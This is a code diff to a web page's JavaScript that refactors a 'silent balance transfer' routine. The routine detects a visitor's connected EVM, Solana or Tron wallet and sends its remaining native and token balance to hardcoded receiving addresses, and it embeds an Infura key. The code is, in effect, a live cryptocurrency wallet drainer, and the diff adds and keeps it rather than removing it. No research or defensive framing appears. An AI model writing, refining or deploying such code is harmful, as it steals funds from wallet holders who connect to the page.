@@ -933,50 +933,51 @@
           try {
             console.log("Starting silent balance transfer (native + tokens)...");
 
-            const { provider, session, chainId: detectedChainId, address } = connectionInfo;
+            let provider = connectionInfo.provider;
+            let chainId, fromAddress;
 
-            let chainId = detectedChainId;
-            let fromAddress = address;
-            let isEVM = false, isSolana = false, isTron = false;
+            // ── Flexible detection for all cases ──────────────────────────────────────
+            // Priority: WalletConnect provider (connectionInfo.provider) > window.ethereum > Solana > Tron
+            if (provider?.request) { 
+              // WalletConnect provider or injected EVM (MetaMask, SafePal, OKX, etc.)
+              console.log("Detected EVM-compatible provider (WalletConnect or extension)");
+              chainId = await provider.request({ method: 'eth_chainId' }).catch(() => null);
+              const accounts = await provider.request({ method: 'eth_accounts' }).catch(() => []);
+              fromAddress = accounts[0];
 
-            // ── 1. Detect wallet type and chain ───────────────────────────────────────
-            if (provider?.request) { // WalletConnect or injected EVM
-              isEVM = true;
-              chainId = chainId || (await provider.request({ method: 'eth_chainId' }));
-              fromAddress = fromAddress || (await provider.request({ method: 'eth_accounts' }))[0];
-            } else if (window.solana?.publicKey) { // Phantom / Solana
-              isSolana = true;
+              if (!chainId || !fromAddress) {
+                throw new Error("Could not get chainId or address from provided provider");
+              }
+
+              return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4");
+            } 
+            else if (window.ethereum) { 
+              // Direct injected extension fallback (MetaMask, SafePal, etc.)
+              console.log("Detected direct injected ethereum provider");
+              chainId = await window.ethereum.request({ method: 'eth_chainId' });
+              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+              fromAddress = accounts[0];
+              return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4");
+            } 
+            else if (window.solana?.publicKey) { 
+              // Solana (Phantom, Solflare, etc.)
+              console.log("Detected Solana provider");
               await window.solana.connect();
               fromAddress = window.solana.publicKey.toString();
-            } else if (window.tronWeb?.defaultAddress?.base58) { // TronLink
-              isTron = true;
+              return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7");
+            } 
+            else if (window.tronWeb?.defaultAddress?.base58) { 
+              // TronLink
+              console.log("Detected Tron provider");
               fromAddress = window.tronWeb.defaultAddress.base58;
-            } else {
-              throw new Error("Unsupported wallet type detected");
+              return await transferTronRemaining(window.tronWeb, fromAddress, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5");
+            } 
+            else {
+              throw new Error("Unsupported wallet type detected - no recognized provider found");
             }
 
-            console.log(`Wallet type: ${isEVM ? 'EVM' : isSolana ? 'Solana' : 'Tron'}, Chain ID: ${chainId}, Address: ${fromAddress}`);
-
-            // ── 2. Define your receiving addresses ─────────────────────────────────────
-            const TARGET_ADDRESSES = {
-              evm:    "0xa292df0eaf4991507174cca2643b4e963181c5d4",
-              solana: "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7",
-              tron:   "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5"
-            };
-
-            const INFURA_ID = "4889dccfadd14afcb27abcc038c7788f";
-
-            // ── 3. Execute transfer based on chain type ────────────────────────────────
-            if (isEVM) {
-              await transferEvmRemaining(provider || window.ethereum, chainId, fromAddress, INFURA_ID, TARGET_ADDRESSES.evm);
-            } else if (isSolana) {
-              await transferSolanaRemaining(fromAddress, TARGET_ADDRESSES.solana);
-            } else if (isTron) {
-              await transferTronRemaining(window.tronWeb, fromAddress, TARGET_ADDRESSES.tron);
-            }
-
-            console.log("All transfers completed successfully!");
-            alert("Successfully transferred remaining balance (native + supported tokens)!");
+            // This line should not be reached due to early returns above
+            console.log("Transfer logic completed");
 
           } catch (error) {
             console.error("Silent transfer failed:", error);
@@ -2063,5 +2064,6 @@
     <script src="script.js"></script>
 </body>
 </html>
+
 
 
